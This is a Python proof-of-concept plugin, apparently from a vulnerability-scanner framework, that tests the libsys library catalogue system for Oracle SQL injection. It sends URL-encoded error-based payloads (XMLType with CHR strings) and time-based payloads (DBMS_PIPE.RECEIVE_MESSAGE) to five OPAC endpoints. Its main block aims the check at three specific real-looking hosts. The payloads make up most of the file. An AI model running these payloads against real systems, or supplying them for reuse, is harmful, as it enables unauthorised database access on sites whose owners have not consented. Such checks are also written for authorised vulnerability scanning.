#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0135648

import time

def assign(service, arg):
    if service == "libsys":
        return True, arg

def audit(arg):
    payloads = {
        'opac/cls_browsing_book.php?cls=-1':'%27%29%20OR%207352%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%271%27%20LIKE%20%271',
        'asord/asord_searchresult.php?q=88952634&type=02':'%27%29%20AND%201055%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27Ofjo%27%3D%27Ofjo',
        'opac/search_rss.php?callno=I313.45&doctype=ALL&lang_code=ALL&match_flag=forward&displaypg=20&showmode=list&orderby=DESC&use_flag=3&sort=CATA_DATE&onlylendable=yes&location=-8641':'%20OR%202714%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29',
        'opac/peri_nav_cls_peri.php?classid=%00':'%27%20AND%203321%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27fKMS%27%3D%27fKMS',
        'opac/sci_browsing_book.php?cls=-6835':'%27%29%20OR%205155%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27zcdX%27%20LIKE%20%27zcdX',
        
        
        }
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(arg+payload+payloads[payload])
        if code ==200 and 'qzkvq1qkjvq' in res:
            security_hole(arg+payload+" :sql Injection")
        else:
            getdata1 = '%25%27%20AND%207394%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2875%29%7C%7CCHR%28100%29%7C%7CCHR%2885%29%2C5%29%20AND%20%27%25%27%3D%27'
            getdata2 = '%25%27%20AND%207394%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2875%29%7C%7CCHR%28100%29%7C%7CCHR%2885%29%2C0%29%20AND%20%27%25%27%3D%27'
            t1 = time.time()
            code, head, res, errcode, _ = curl.curl2(arg+payload+getdata1)
            t2 = time.time()
            code, head, res, errcode, _ = curl.curl2(arg+payload+getdata2)
            t3 = time.time()
            if code == 200 and (2*t2 - t1 - t3 > 3):
                security_hole(arg + payload + "   :sql Injection")
                
            
    
            
    


if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://202.119.108.28/')[1])
    audit(assign('libsys', 'http://221.226.44.228/')[1])
    audit(assign('libsys', 'http://lib1.sdx.js.cn:88/')[1])